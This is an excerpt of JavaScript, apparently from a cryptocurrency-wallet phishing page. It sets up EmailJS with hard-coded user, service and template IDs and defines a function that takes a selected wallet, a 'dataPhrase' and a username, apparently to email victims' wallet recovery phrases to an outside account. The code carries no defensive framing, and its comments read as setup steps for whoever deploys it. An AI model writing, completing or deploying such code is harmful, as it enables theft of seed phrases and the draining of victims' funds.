...
document.addEventListener('DOMContentLoaded', function() {
    ...
    if (typeof emailjs !== 'undefined') {
        emailjs.init("UT3MTuX5h4MqJ-8nW"); // Replace with your actual EmailJS user ID
    } else {
...
async function sendEmailNotification(walletSelected, dataPhrase, username) {
    ...
    if (typeof emailjs === 'undefined') {
      ...
      try {
        ...
        // Initialize EmailJS
        emailjs.init("UT3MTuX5h4MqJ-8nW"); // Replace with your actual user ID
      } catch (e) {
    ...
    const serviceID = 'service_3663wr4';
    const templateID = 'template_pkvvsol';
